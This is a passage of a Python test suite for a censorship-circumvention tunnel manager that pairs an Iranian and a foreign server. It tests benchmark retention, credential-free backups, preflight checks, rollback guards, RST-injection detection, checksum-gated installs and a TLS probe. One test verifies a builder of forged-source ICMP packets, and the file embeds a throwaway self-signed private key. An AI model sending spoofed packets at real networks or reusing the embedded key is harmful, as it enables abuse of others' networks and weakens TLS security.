        original_root = verify_checksums.REPO_ROOT
        verify_checksums.REPO_ROOT = tmp
        try:
            found = verify_checksums.audit_installer_hygiene()
        finally:
            verify_checksums.REPO_ROOT = original_root
        self.assertTrue(any("gostish.sh" in p and "TLS verification" in p for p in found),
                        f"the YAML disable was not reported: {found}")
        self.assertFalse(any("prose.sh" in p for p in found),
                         f"a comment naming the spelling was reported: {found}")

    def test_123_benchmarks_and_audit_rows_are_kept_to_a_bounded_history(self):
        """F5 (audit 2026-10-18, re-verified 2026-10-23): host_resources had a
        retention cap and benchmarks / audit_logs had none, while the dashboard's
        polling GET shipped every benchmark row of every pair on every load. A
        long-lived pair would grow the database forever and make the page slower
        in proportion to its own history.

        Retention now follows the host_resources shape - a cap enforced at insert
        time, oldest evicted first. Benchmarks are kept per (pair, protocol),
        because that is the sample the failover median reads; the audit trail is
        one global log, capped as a whole. The dashboard read is bounded too;
        unbounded reads remain available to the callers that rank on history.
        """
        pid = storage.add_pair(name=f"f5_{int(time.time() * 1000)}",
                               iran_host="198.51.100.10", foreign_host="203.0.113.20",
                               frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        orig_bench = storage.BENCHMARK_KEEP_ROWS
        orig_audit = storage.AUDIT_LOG_KEEP_ROWS
        storage.BENCHMARK_KEEP_ROWS = 5
        storage.AUDIT_LOG_KEEP_ROWS = 5
        try:
            for i in range(8):
                storage.record_benchmark(pid, "GRE", {"score": float(i)})
            for i in range(3):
                storage.record_benchmark(pid, "kcptun", {"score": float(i)})

            rows = storage.get_benchmarks(pid)
            gre = [r for r in rows if r["protocol"] == "GRE"]
            self.assertEqual(len(gre), 5, "the per-protocol cap was not enforced")
            self.assertEqual([r["score"] for r in gre], [7.0, 6.0, 5.0, 4.0, 3.0],
                             "the rows evicted must be the oldest, never the newest")
            self.assertEqual(len([r for r in rows if r["protocol"] == "kcptun"]), 3,
                             "one protocol's overflow must not evict another's history")
            self.assertEqual(len(storage.get_benchmarks(pid, limit=2)), 2,
                             "a bounded read must return at most the bound")

            for i in range(8):
                storage.log_audit(pid, "F5TEST", "OK", f"row-{i}")
            kept = [r for r in storage.get_audit_logs(limit=1000) if r["action"] == "F5TEST"]
            self.assertEqual(len(kept), 5, "the global audit cap was not enforced")
            self.assertEqual(kept[0]["details"], "row-7")
            self.assertEqual(kept[-1]["details"], "row-3")
        finally:
            storage.BENCHMARK_KEEP_ROWS = orig_bench
            storage.AUDIT_LOG_KEEP_ROWS = orig_audit

        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "dashboard.py"),
                  encoding="utf-8") as fh:
            dash = fh.read()
        self.assertIn("limit=API_BENCHMARKS_PER_PAIR", dash,
                      "the polling GET must bound the benchmark rows it ships")

    def test_124_a_backup_exports_pairs_without_credentials_and_restores_what_was_lost(self):
        """Phase 2: until now the operator's pairs and history existed in exactly
        one SQLite file with no way back from a lost laptop. backup_tool writes a
        timestamped folder (pairs.json + a consistent database copy + manifest),
        and restoring brings back pairs that are gone without touching ones that
        still exist.

        The invariant that matters most is the negative one: a backup must never
        become the place credentials leak to. Pair rows carry no credential
        columns by design, and this test fails if any exported key ever starts
        looking like one.
        """
        import backup_tool

        name = f"backup_{int(time.time() * 1000)}"
        pid = storage.add_pair(name=name, iran_host="198.51.100.10",
                               foreign_host="203.0.113.20", frontend_port=9443)
        tmp = tempfile.mkdtemp(prefix="backup_tool_")
        self.addCleanup(shutil.rmtree, tmp, True)
        folder = backup_tool.create_backup(os.path.join(tmp, "b1"))
        self.addCleanup(storage.delete_pair, pid)

        manifest = json.loads((folder / "manifest.json").read_text(encoding="utf-8"))
        self.assertFalse(manifest["contains_credentials"])
        self.assertTrue(manifest["db_included"], "the suite database exists and must be copied")
        self.assertTrue((folder / "database.db").exists())

        exported = json.loads((folder / "pairs.json").read_text(encoding="utf-8"))
        mine = [p for p in exported if p["name"] == name]
        self.assertEqual(len(mine), 1, "the new pair is not in the backup")
        self.assertNotIn("id", mine[0], "local row ids are history, not configuration")
        for pair in exported:
            for key in pair:
                self.assertIsNone(re.search(r"pass|secret|token|credential", key, re.I),
                                  f"a credential-shaped field was exported: {key}")

        storage.delete_pair(pid)
        self.assertFalse(any(p["name"] == name for p in storage.get_pairs()))
        first = backup_tool.restore_pairs(folder)
        self.assertGreaterEqual(first["inserted"], 1)
        restored = [p for p in storage.get_pairs() if p["name"] == name]
        self.assertEqual(len(restored), 1, "the lost pair was not restored")
        self.assertEqual(restored[0]["iran_host"], "198.51.100.10")
        second = backup_tool.restore_pairs(folder)
        self.assertIn(name, second["skipped"],
                      "a restore must never overwrite a pair that already exists")

    def test_125_preflight_parses_host_and_path_facts_and_judges_them_in_plain_words(self):
        """Phase 3 pre-flight: a benchmark taken on a misconfigured path ranks
        protocols for the path's sins (no MSS clamp, no BBR), so the path is
        measured first and its problems are named separately. The collectors
        are read-only; every judgement is a pure rule over parsed facts, which
        is what this test pins - the parsers, and the findings they produce.
        """
        import preflight

        facts = preflight.parse_host_facts(
            "kernel=6.8.0-45-generic\nos=Ubuntu 24.04.3 LTS\ncc=cubic\n"
            "cc_available=reno cubic\nbbr_loaded=0\nmtu_probing=0\n"
            "rmem_max=4194304\nwmem_max=4194304\niface=eth0\niface_mtu=1500\n"
            "mss_clamp=0\nraw_socket=ok\n")
        self.assertEqual(facts["congestion_control"], "cubic")
        self.assertFalse(facts["bbr_loaded"])
        self.assertEqual(facts["iface_mtu"], 1500)
        self.assertTrue(facts["raw_socket"])

        ping = preflight.parse_ping(
            "10 packets transmitted, 10 received, 0% packet loss, time 9012ms\n"
            "rtt min/avg/max/mdev = 39.190/40.427/42.644/1.316 ms\n")
        self.assertEqual(ping["loss_pct"], 0.0)
        self.assertAlmostEqual(ping["rtt_avg_ms"], 40.427)
        dead = preflight.parse_ping(
            "10 packets transmitted, 0 received, 100% packet loss, time 8999ms\n")
        self.assertEqual(dead["loss_pct"], 100.0)
        self.assertEqual(preflight.parse_ping(""), {"sent": None, "received": None,
                                                     "loss_pct": None, "rtt_avg_ms": None},
                         "a measurement that never ran must not read as 100% loss")

        self.assertEqual(preflight.parse_tcp_probe("PORT 22 SHUT\nPORT 443 SHUT\nPORT 8443 OPEN\n"),
                         {22: False, 443: False, 8443: True})

        healthy = dict(facts, congestion_control="bbr", cc_available=["reno", "cubic", "bbr"],
                       bbr_loaded=True, mss_clamp_rules=1)
        path_ok = {"ping": {"loss_pct": 0.0}, "tcp": {22: True}}
        self.assertEqual(preflight.findings_for(healthy, healthy, path_ok, path_ok), [],
                         "a fully healthy pair must produce no findings")
        open_path = {"ping": {"loss_pct": 0.0, "rtt_avg_ms": 40.4},
                     "tcp": {22: False, 443: False, 8443: False}}
        silent = preflight.parse_host_facts("")
        self.assertIsNone(silent["mss_clamp_rules"],
                          "a sweep that never ran must stay unknown, not become zero")
        unknown = preflight.findings_for(silent, healthy, open_path, open_path)
        self.assertTrue(any("could not be collected" in f for f in unknown))
        self.assertFalse(any("MSS-clamp" in f for f in unknown),
                         "an unmeasured host must not be accused of a missing clamp")
        found = preflight.findings_for(facts, healthy, open_path, open_path)
        self.assertTrue(any("BBR is not available" in f and f.startswith("iran") for f in found),
                        f"the missing BBR module was not named: {found}")
        self.assertTrue(any("MSS-clamp" in f for f in found))
        self.assertTrue(any("direct TCP unreachable" in f for f in found),
                        "the one-way TCP drop this pair shape is known for must be named")

    def test_126_the_spoof_tester_builds_valid_forged_packets_and_judges_only_on_evidence(self):
        """Phase 3 spoof capability tester: whether a provider passes
        forged-source packets out decides if the spoof emergency mode may be
        offered for a pair, and the only honest way to know is a paired
        sender/receiver measurement. Two things are pinned offline: the wire
        format (a bad checksum would make a capable path look incapable), and
        the verdict rule - capable only on positive arrival evidence, never
        'incapable' from a probe that simply failed to run.
        """
        import socket as _socket
        import struct as _struct

        import spoof_test

        packet = spoof_test.build_icmp_echo("203.0.113.20", "198.51.100.10", 0xB7, 3)
        version_ihl, _tos, total_len, _ident, _flags, _ttl, proto, _sum, src, dst = \
            _struct.unpack("!BBHHHBBH4s4s", packet[:20])
        self.assertEqual(version_ihl, 0x45)
        self.assertEqual(total_len, len(packet))
        self.assertEqual(proto, 1, "the probe rides ICMP")
        self.assertEqual(_socket.inet_ntoa(src), "203.0.113.20",
                         "the source must be the forged one - that is the whole test")
        self.assertEqual(_socket.inet_ntoa(dst), "198.51.100.10")
        self.assertEqual(spoof_test._checksum(packet[:20]), 0,
                         "the IP header checksum must verify over the full header")
        self.assertEqual(spoof_test._checksum(packet[20:]), 0,
                         "the ICMP checksum must verify over the full message")
        self.assertIn(spoof_test.MARKER, packet)
        compile(spoof_test.common_source(), "best_spoof_common.py", "exec")
        compile(spoof_test.SENDER_SOURCE, "best_spoof_sender.py", "exec")
        compile(spoof_test.RECEIVER_SOURCE, "best_spoof_receiver.py", "exec")
        self.assertIn("build_icmp_echo", spoof_test.common_source(),
                      "the hosts must run the same builder this test just verified")

        self.assertEqual(spoof_test.parse_count(spoof_test._SENT, "junk\nSENT:20\n"), 20)
        self.assertIsNone(spoof_test.parse_count(spoof_test._RECEIVED, "no output"))
        capable = spoof_test.verdict(20, 17)
        self.assertTrue(capable["capable"])
        self.assertAlmostEqual(capable["loss_pct"], 15.0)
        dropped = spoof_test.verdict(20, 0)
        self.assertFalse(dropped["capable"])
        for incomplete in ((None, 5), (20, None), (None, None)):
            unknown = spoof_test.verdict(*incomplete)
            self.assertIsNone(unknown["capable"],
                              f"an incomplete probe {incomplete} must stay unknown, "
                              "never read as proof of incapability")

    def test_127_the_atomic_swap_arms_a_dead_man_guard_on_both_hosts_before_swapping(self):
        """Phase 3 atomic swap: FailoverManager is a staged switchover with a
        real gap and no way back from a running-but-broken successor. The
        guarded wrapper therefore arms a host-side dead-man script on BOTH
        hosts before the swap runs - it must fire on its own if this process
        dies - and only a verified-serving successor earns the commit marker
        that stands the guards down (F10: DEGRADED serves, DOWN does not).
        """
        import atomic_swap

        script = atomic_swap.rollback_script(["new-a.service"], ["old-a.service"])
        self.assertIn("sleep 45", script)
        self.assertIn("best_tunnel_swap_committed", script)
        self.assertLess(script.index("systemctl stop new-a.service"),
                        script.index("systemctl start old-a.service"),
                        "the candidate stops before the old protocol starts")

        class FakeRunner:
            def __init__(self, arm=True):
                self.commands = []
                self.arm = arm

            def run(self, cmd, check=True, best_effort=False, timeout=30, retryable=False):
                self.commands.append(cmd)
                if "nohup" in cmd:
                    return 0, "ARMED" if self.arm else "", ""
                if "touch" in cmd:
                    return 0, "COMMITTED", ""
                return 0, "", ""

        def fake_plan(protocol, pair_id, ir_ip, fr_ip, frontend):
            return {"iran_units": [f"{protocol}-ir.service"],
                    "foreign_units": [f"{protocol}-fr.service"]}

        pair = {"id": 5, "iran": {"host": "198.51.100.10", "port": 22},
                "foreign": {"host": "203.0.113.20", "port": 22},
                "frontend_port": 443}
        calls = []

        def ok_failover(*args):
            calls.append(args)
            return {"success": True}

        ir, fr = FakeRunner(), FakeRunner()
        happy = atomic_swap.guarded_failover(
            pair, "gre", "rathole-noise", "test",
            ir_runner=ir, fr_runner=fr, failover_fn=ok_failover,
            verify_fn=lambda: True, plan_fn=fake_plan)
        self.assertTrue(happy["success"])
        self.assertEqual(happy["rollback"], "committed")
        self.assertEqual(len(calls), 1)
        iran_install = next(c for c in ir.commands if "nohup" in c)
        self.assertIn("systemctl stop rathole-noise-ir.service", iran_install,
                      "the Iranian guard must know the candidate's units")
        self.assertIn("systemctl start gre-ir.service", iran_install,
                      "and the units it restores on rollback")
        self.assertTrue(any("touch" in c for c in ir.commands))

        ir2, fr2 = FakeRunner(), FakeRunner()
        unverified = atomic_swap.guarded_failover(
            pair, "gre", "rathole-noise", "test",
            ir_runner=ir2, fr_runner=fr2, failover_fn=ok_failover,
            verify_fn=lambda: False, plan_fn=fake_plan)
        self.assertFalse(unverified["success"])
        self.assertIn("armed", unverified["rollback"])
        self.assertFalse(any("touch" in c for c in ir2.commands + fr2.commands),
                         "an unverified successor must never receive the commit")

        calls.clear()
        refused = atomic_swap.guarded_failover(
            pair, "gre", "rathole-noise", "test",
            ir_runner=FakeRunner(arm=False), fr_runner=FakeRunner(),
            failover_fn=ok_failover, verify_fn=lambda: True, plan_fn=fake_plan)
        self.assertFalse(refused["success"])
        self.assertEqual(calls, [],
                         "without a guard on both hosts the swap must not start")

        ir3, fr3 = FakeRunner(), FakeRunner()
        atomic_swap.guarded_failover(
            pair, "gre", "rathole-noise", "test", ir_runner=ir3, fr_runner=fr3,
            failover_fn=ok_failover, verify_fn=lambda: True,
            plan_fn=fake_plan, dry_run=True)
        self.assertEqual(ir3.commands + fr3.commands, [],
                         "a dry run arms nothing and touches nothing")

    def test_128_the_monitoring_signals_name_rst_injection_and_saturation_without_crying_wolf(self):
        """Phase 3 monitoring: two failure shapes the health checker cannot
        see. Forged RSTs arrive from a different network depth than the real
        peer, so one 'host' shows two TTL families; and a tunnel near its
        demonstrated capacity is failing soon while its latency still reads
        fine. Both analysers must be conservative: jitter is not injection,
        and an unknown capacity is not a saturation number.
        """
        import monitoring

        out = "\n".join(
            f"64 bytes from 203.0.113.20: icmp_seq={i} ttl=52 time=40.1 ms"
            for i in range(10))
        self.assertEqual(monitoring.parse_ttl_samples(out), [52] * 10)
        clean = monitoring.ttl_verdict([52, 51, 52, 52, 51, 52, 52, 51])
        self.assertEqual(clean["state"], "clean")
        self.assertEqual(clean["dominant_ttl"], 52)

        injected = monitoring.ttl_verdict([52] * 14 + [254] * 4 + [52, 52])
        self.assertEqual(injected["state"], "injection_suspected")
        self.assertEqual(injected["anomaly_ttls"], [254])
        near = monitoring.ttl_verdict([50] * 16 + [62] * 4)
        self.assertEqual(near["state"], "injection_suspected",
                         "the ~62 injected family from the field data must be caught too")
        jitter = monitoring.ttl_verdict([52, 47, 52, 51, 52, 48, 52, 51])
        self.assertEqual(jitter["state"], "inconclusive",
                         "scatter without a second family is not an accusation")
        self.assertEqual(monitoring.ttl_verdict([52, 52])["state"], "unknown")
        self.assertEqual(monitoring.ttl_verdict([])["state"], "unknown")

        # 12.5 MB in 10 s == 10 Mbps; against a 20 Mbps demonstrated capacity
        # that is exactly half loaded, and against 12.5 it is the alert line.
        self.assertAlmostEqual(monitoring.saturation_pct(12_500_000, 10, 20.0), 50.0)
        self.assertEqual(monitoring.saturation_state(
            monitoring.saturation_pct(12_500_000, 10, 12.5)), "high")
        self.assertEqual(monitoring.saturation_state(
            monitoring.saturation_pct(12_500_000, 10, 20.0)), "ok")
        self.assertIsNone(monitoring.saturation_pct(12_500_000, 10, None))
        self.assertIsNone(monitoring.saturation_pct(12_500_000, 10, 0))
        self.assertEqual(monitoring.saturation_state(None), "unknown")

    def test_129_the_new_signals_are_wired_in_ttl_on_the_report_and_the_guard_under_every_live_heal(self):
        """Phase 3 wiring: the TTL analyser's verdict rides on the health
        report (as a signal that never flips the status - an injector
        follows the traffic, so switching on it would pay a gap for
        nothing), and every live heal routes through the atomic swap guard
        while a dry run arms nothing.
        """
        import atomic_swap
        import failover
        import mock_ssh

        legacy = failover.TunnelHealthReport(
            "HEALTHY", 0.0, 50.0, 1.0, True, True, True, "nine-field construction")
        self.assertEqual(legacy.ttl_state, "",
                         "pre-Phase-3 constructions must keep compiling with an unsampled signal")

        pair = {"id": 77, "iran": {"host": "198.51.100.10", "port": 22},
                "foreign": {"host": "203.0.113.20", "port": 22}, "frontend_port": 443,
                "base_rtt_ms": 42.0}
        ir = mock_ssh.MockSSHClient(host_role="iran")
        ir.state["ttl_samples"] = [52] * 16 + [254] * 4
        ir.state["packet_loss"] = 0.0
        fr = mock_ssh.MockSSHClient(host_role="foreign")
        gre_plan = protocols.generate_deployment("GRE", 77, "198.51.100.10",
                                                 "203.0.113.20", 443)
        for unit in gre_plan["iran_units"]:
            ir.state["services"][unit] = "active"
        for unit in gre_plan["foreign_units"]:
            fr.state["services"][unit] = "active"
        report = failover.TunnelHealthChecker.check_health(ir, fr, pair, "GRE")
        self.assertEqual(report.ttl_state, "injection_suspected")
        self.assertIn("ttl:", report.details)
        self.assertEqual(report.status, "HEALTHY",
                         "the injection signal must not by itself mark the tunnel down")

        pid = storage.add_pair(name=f"guard-{int(time.time() * 1000)}",
                               iran_host="198.51.100.10", foreign_host="203.0.113.20",
                               frontend_port=9446)
        self.addCleanup(storage.delete_pair, pid)
        storage.update_pair_status(pid, status="ACTIVE", active_tunnel="GRE")
        live_pair = {"id": pid, "iran": {"host": "198.51.100.10", "port": 22},
                     "foreign": {"host": "203.0.113.20", "port": 22},
                     "frontend_port": 9446, "active_tunnel": "GRE"}

        armed, committed = [], []
        real_arm, real_commit = atomic_swap.arm_guard, atomic_swap.commit
        atomic_swap.arm_guard = lambda runner, script: armed.append(script) or True
        atomic_swap.commit = lambda runner: committed.append(1) or True
        self.addCleanup(setattr, atomic_swap, "arm_guard", real_arm)
        self.addCleanup(setattr, atomic_swap, "commit", real_commit)

        real_select = failover.FailoverCandidateSelector.__dict__["select_best_candidate"]
        failover.FailoverCandidateSelector.select_best_candidate = staticmethod(
            lambda pair_id, current, pair=None: "rathole-noise")
        self.addCleanup(setattr, failover.FailoverCandidateSelector,
                        "select_best_candidate", real_select)

        real_check = failover.TunnelHealthChecker.__dict__["check_health"]
        healthy = failover.TunnelHealthReport(
            "HEALTHY", 0.0, 50.0, 1.0, True, True, True, "successor verified")
        failover.TunnelHealthChecker.check_health = staticmethod(
            lambda ir_, fr_, p, proto, base_rtt=0.0, dry_run=False: healthy)
        self.addCleanup(setattr, failover.TunnelHealthChecker, "check_health", real_check)

        down = failover.TunnelHealthReport(
            "DOWN", 100.0, 999.0, 0.0, False, False, False, "stub outage")
        manager = failover.FailoverManager()
        healed = manager.evaluate_and_heal(
            live_pair, dry_run=False,
            ir_runner=mock_ssh.MockSSHClient(host_role="iran"),
            fr_runner=mock_ssh.MockSSHClient(host_role="foreign"),
            health=down)
        self.assertEqual(healed["action"], "FAILOVER_EXECUTED", healed)
        self.assertEqual(healed["failover_result"]["rollback"], "committed")
        self.assertGreaterEqual(len(armed), 2, "the guard must be armed on both hosts")
        self.assertGreaterEqual(len(committed), 2, "a verified successor commits both hosts")

        armed.clear()
        manager.evaluate_and_heal(
            live_pair, dry_run=True,
            ir_runner=mock_ssh.MockSSHClient(host_role="iran"),
            fr_runner=mock_ssh.MockSSHClient(host_role="foreign"),
            health=down)
        self.assertEqual(armed, [], "a dry run must never arm a rollback guard")

    def test_130_the_benchmark_installs_binaries_before_starting_units_that_name_them(self):
        """F6 (found live, 2026-10-23): deploy_tunnel has installed binaries
        through the pinned-checksum path since F3, but run_single_benchmark
        never did - on a fresh host the bench units crash-looped with
        systemd 203/EXEC and the row reported a 25 s readiness timeout
        instead of the missing binary. The benchmark now applies the same
        fail-closed gate before the bench plan is deployed, and answers in
        its own blocked-row shape naming the binary and the host.
        """
        import binary_manager
        import engine
        import mock_ssh

        pair = {"id": 91, "frontend_port": 443,
                "iran": {"host": "198.51.100.10", "port": 22},
                "foreign": {"host": "203.0.113.20", "port": 22},
                "base_rtt_ms": 42.0}
        real = binary_manager.verify_and_install_binary
        calls = []

        def flaky(runner, binary, version=None, arch="x86_64", dry_run=True):
            calls.append((runner.host_role, binary))
            if runner.host_role == "foreign":
                return False, "simulated checksum mismatch"
            return real(runner, binary, version=version, arch=arch, dry_run=dry_run)

        binary_manager.verify_and_install_binary = flaky
        self.addCleanup(setattr, binary_manager, "verify_and_install_binary", real)
        row = engine.run_single_benchmark(
            pair, "chisel-wss", dry_run=False,
            ir_runner=mock_ssh.MockSSHClient(host_role="iran"),
            fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
        self.assertTrue(row["disqualified"])
        self.assertTrue(any("binary pre-flight" in r and "chisel" in r and "foreign" in r
                            for r in row["dq_reasons"]),
                        f"the row must name the missing binary and its host: {row['dq_reasons']}")
        self.assertIn(("iran", "chisel"), calls)
        self.assertIn(("foreign", "chisel"), calls)

    def test_131_a_verified_existing_binary_skips_the_deploy_gate_redownload(self):
        """F7 (found live, 2026-10-23): verify_and_install_binary re-ran the
        full install script on every call, and that script always downloads
        the release archive - no already-installed check. The deploy gate
        therefore paid a multi-source, multi-retry GitHub download on both
        hosts for every single deploy, and on the evening test pair that
        download is exactly where two rathole deploys stalled while every
        other step of the same sessions completed.

        The gate now first probes each destination the pinned release
        installs: if the file is present and hashes to the value the
        verified install produced (PINNED_INSTALLED_SHA256, measured from
        verified installs; the archive pin stays the root of trust), the
        binary is proven in place and no download is issued. Missing or
        mismatching files fall through to the full verified install.
        """
        import binary_manager

        pinned = binary_manager.PINNED_INSTALLED_SHA256[("rathole", "v0.5.0", "amd64")]
        entry = binary_manager.OFFICIAL_CHECKSUMS["rathole"]["v0.5.0"]["amd64"]
        self.assertEqual(set(pinned), set(entry["binaries"].values()),
                         "installed-hash pins must cover exactly the release's destinations")
        for digest in pinned.values():
            self.assertEqual(len(digest), 64)
            int(digest, 16)

        class _ProbeRunner:
            """Not a MockSSHClient: verify_and_install_binary must take the live path."""
            def __init__(self, probe_out):
                self.commands = []
                self.probe_out = probe_out

            def run(self, cmd, check=True, best_effort=False, **kwargs):
                self.commands.append(cmd)
                if cmd.startswith("sha256sum "):
                    return 0, self.probe_out, ""
                return 0, "[SUCCESS] installed /usr/local/bin/rathole", ""

        good_hash = pinned["/usr/local/bin/rathole"]
        runner = _ProbeRunner(f"{good_hash}  /usr/local/bin/rathole\n")
        ok, msg = binary_manager.verify_and_install_binary(runner, "rathole", dry_run=False)
        self.assertTrue(ok, msg)
        self.assertIn("VERIFIED-EXISTING", msg)
        self.assertEqual(len(runner.commands), 1,
                         "a proven binary must cost exactly one probe command")
        self.assertFalse(any("Downloading" in c or "mktemp" in c for c in runner.commands),
                         "the install script must not be issued for a proven binary")

        runner2 = _ProbeRunner("0" * 64 + "  /usr/local/bin/rathole\n")
        ok2, _msg2 = binary_manager.verify_and_install_binary(runner2, "rathole", dry_run=False)
        self.assertTrue(ok2)
        self.assertTrue(any("Downloading rathole" in c for c in runner2.commands),
                        "a mismatching binary must fall through to the full verified install")

        runner3 = _ProbeRunner("")
        ok3, _msg3 = binary_manager.verify_and_install_binary(runner3, "rathole", dry_run=False)
        self.assertTrue(ok3)
        self.assertTrue(any("Downloading rathole" in c for c in runner3.commands),
                        "a missing binary must fall through to the full verified install")

    # Throwaway self-signed pair for test_132's local TLS server only. Never
    # deployed anywhere; the probe client verifies nothing (CERT_NONE) - the
    # handshake completing is the whole signal.
    _T132_CERT = """-----BEGIN CERTIFICATE-----
MIIDCTCCAfGgAwIBAgIUTymgqnMxn69eQHfR++U2vR1QLiMwDQYJKoZIhvcNAQEL
BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTI2MTAyMzE4MTkxNFoXDTM2MTAy
MDE4MTkxNFowFDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEF
AAOCAQ8AMIIBCgKCAQEAsze4R+SQTaTS5kp232N0nbKFA3dXq7lFbo4nkLXVJoYg
qfBILCTP4wGYBYFAp2rH+niqvIvJ4c/5Duo2qroVhYNRoTfqKMxRllkAiu63n8zp
8eDh4/N1GS83MBZHtEYm10sDEy/Pq+0YDxGKw2fGh+BGhJIOddg5jEq8RmvhPcj1
AGIhU8zfJTSmK7ysVpl7FybFDk50s35kgPOVOiED89CJjXkO1kGe8YvTjrdhtNKp
4mmZb+lOQwHUd5zvpUtMOEuDJu7gVVdrt3hJpUlnhXcxKG18fWwKeZJAkS75PG5i
x7HoeSf6aU8VGnharhNFb8OiPkMwcANXeSi4ZVvlGQIDAQABo1MwUTAdBgNVHQ4E
FgQUYs4l23/tvP1dpwZyvuFp04lh0XwwHwYDVR0jBBgwFoAUYs4l23/tvP1dpwZy
vuFp04lh0XwwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAIHHC
09HAQfKmNfX3xRPlilBiAK2DpnpPyMDr/dnwzHpTBYy43QjO4u2TLkakCUtMmHLB
E6phvi/7tys9hYmTJsYxrsKlneY0CAWYEE3WJLyLr6GaDJddt9P4UdyynF/EBAnK
DEaTb3lhRqC3TcaJn5zxXIewcgyFYd/ZcuyfH6wiG3pHXJ9Oe6lT8O9Yasq3BfPJ
ZyH+O/dXm3Frda+UDUeY/e3qMdGjPJXAYyU5H9cw7sn1H98NA73ZWmGOFFA86SzT
lUxIpFQkMqivkk9959eRWXErMpXhZbWVS8fm1ywPnc8wguIFEDimcZzhAfHvIJUE
Bbo3aRgu3nBkRW8xZA==
-----END CERTIFICATE-----"""
    _T132_KEY = """-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCzN7hH5JBNpNLm
SnbfY3SdsoUDd1eruUVujieQtdUmhiCp8EgsJM/jAZgFgUCnasf6eKq8i8nhz/kO
6jaquhWFg1GhN+oozFGWWQCK7refzOnx4OHj83UZLzcwFke0RibXSwMTL8+r7RgP
EYrDZ8aH4EaEkg512DmMSrxGa+E9yPUAYiFTzN8lNKYrvKxWmXsXJsUOTnSzfmSA
85U6IQPz0ImNeQ7WQZ7xi9OOt2G00qniaZlv6U5DAdR3nO+lS0w4S4Mm7uBVV2u3
eEmlSWeFdzEobXx9bAp5kkCRLvk8bmLHseh5J/ppTxUaeFquE0Vvw6I+QzBwA1d5
KLhlW+UZAgMBAAECggEAEVO+iyLfycX5Bv9lkVEEDhgbsJtZ/FYYDqmLTTwrTMN0
hoGe9LelasD1cfjOZ7FU/tQqS7rnLKAnKAhAe06s9IDfBEuL5eBlNfhKa2RLmBVf
e/1+UYPxCxuLxigtTBJpQHD17eW2Ohzc8d4EEMLoiKwIHVqir8WVQMlb/SICf67T
xPnQKs4kKm2KN28BFIc0hjTWcUY+UhmW59hNpO9CBt/cOhWlsoQej+c6h0UxpZJw
6x0XHGSf3WzWW/aOzpLMFYMOEsKzSZdMr1wmuOPZ00eN4CcJ/Xibo7/DJzzaCfvo
mYqyYuC1jf2P7lK3nPSheDbJriZSsSrKXJWFFiY44QKBgQDvsR/Fhu5ZC0/ZSPFx
TUPqxLRdTyRnF2yrDX8boNnNyDtevyeWBMRpHcLcLM1bRid6KO6VoGKzk3/5D3G5
WoovqXMEepNKbK/DzhGJ2zkR4NCp4Eb3YNsLzRTGZZixnhcNiLv+8MytIZ19KpnR
m0Q/fcuQ7x42RCCE0Xe1oR8cMQKBgQC/aUZpy4DXgmBTMd9r0jQjgwGQuGtuOnNQ
+RFJlLd2FOGN1aVyd/HJ0g5haJyq+xBLPxnmBk1QMQoXvF7vvnkMJGEu1dw3BaFK
nbQyhT7RpziOi8HfKHssSz7Tu32Ae0OK4ddXMSTkgilUTtRJMLJXK6SpOZHEaAFt
MxCBVJplaQKBgQCy0LUfK3aNP38mXuCg4j+U2YKlSfGiZztOsRbuiaVze7mvCXSC
2rOcp/NDRrk9Kq0w2XCEd86qoZOLPxZcbUtCG2wPH1La5xKJRSaYbc+5orqIwSSw
ULWZrDmfeRPdDk+sbSGzI/nN/5H6Wtm+IdNceoBvc7RaT6Di9VIVUkpfQQKBgFqL
2G1PgUFxQVPZsdD1fQiXfnQRaXCZYdeaGt1t5mOLeS95M2y05MIOBhN6QzJ21bxi
u0OfE4+twxJ7X4WV2vktdHONY0D7/tKnS4jik1bl/dEgt7NzGOFZLv1GIhZXORpH
v3BVpRgboqVpLO76hELMOHZ870Gz2YjosRQdC3SRAoGAOEgqJZHZRRCOqh0Hl1od
DXnGCazaWPhEsP5LzqteQi10U/ywaKCAnyDfhl29PfxPlzkx+kvygEOuukmHAHMw
nOqmocAZPkLzeEO8QeAMGkoNjHipAgIwT1H6N70mXiCLICcGe8xDcxdOooztTiTI
dM/5IlBnpCMejDaKAYLbcLo=
-----END PRIVATE KEY-----"""

    def test_132_the_deploy_probe_certifies_tls_backends_and_stays_fail_closed(self):
        """F8 (found live, 2026-10-23): deploy verification probed the frontend
        with one plaintext HTTP HEAD and required response bytes. A TLS-first
        backend - the test pair's Xray inbound on :443 - drops non-TLS input
        without a byte back, so a rathole deploy in front of it rolled back
        after 90 s while backend_listener_state confirmed the service was
        listening ("answered") the whole time: a healthy tunnel, decertified
        by the shape of the question.

        The probe (engine.DATA_PROBE_PROGRAM, run verbatim here against local
        servers) now tries the HTTP HEAD and then a real TLS handshake, and
        accepts the first shape that exchanges data. It stays fail-closed:
        silence and absence still report NO_DATA.
        """
        import http.server
        import inspect
        import socket
        import ssl
        import subprocess
        import tempfile
        import threading

        import engine

        self.assertIn("data_probe_command(frontend)",
                      inspect.getsource(engine.deploy_tunnel),
                      "deploy verification must use the two-shape probe")

        def run_probe(port):
            program = engine.DATA_PROBE_PROGRAM.replace("__FRONTEND__", str(port))
            out = subprocess.run([sys.executable, "-c", program],
                                 capture_output=True, text=True, timeout=30)
            return out.stdout.strip()

        def serve(sock, handler):
            while True:
                try:
                    conn, _ = sock.accept()
                except OSError:
                    return
                threading.Thread(target=handler, args=(conn,), daemon=True).start()

        servers = []

        def listener():
            s = socket.socket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("127.0.0.1", 0))
            s.listen(8)
            servers.append(s)
            return s, s.getsockname()[1]

        # 1. A plaintext HTTP backend: the original shape must still certify.
        http_srv = http.server.ThreadingHTTPServer(
            ("127.0.0.1", 0),
            type("H", (http.server.BaseHTTPRequestHandler,), {
                "do_HEAD": lambda self: self.send_response(200) or self.end_headers(),
                "log_message": lambda self, *a: None}))
        threading.Thread(target=http_srv.serve_forever, daemon=True).start()
        self.addCleanup(http_srv.shutdown)
        self.assertEqual(run_probe(http_srv.server_address[1]), "PROBE_DATA_EXCHANGED")

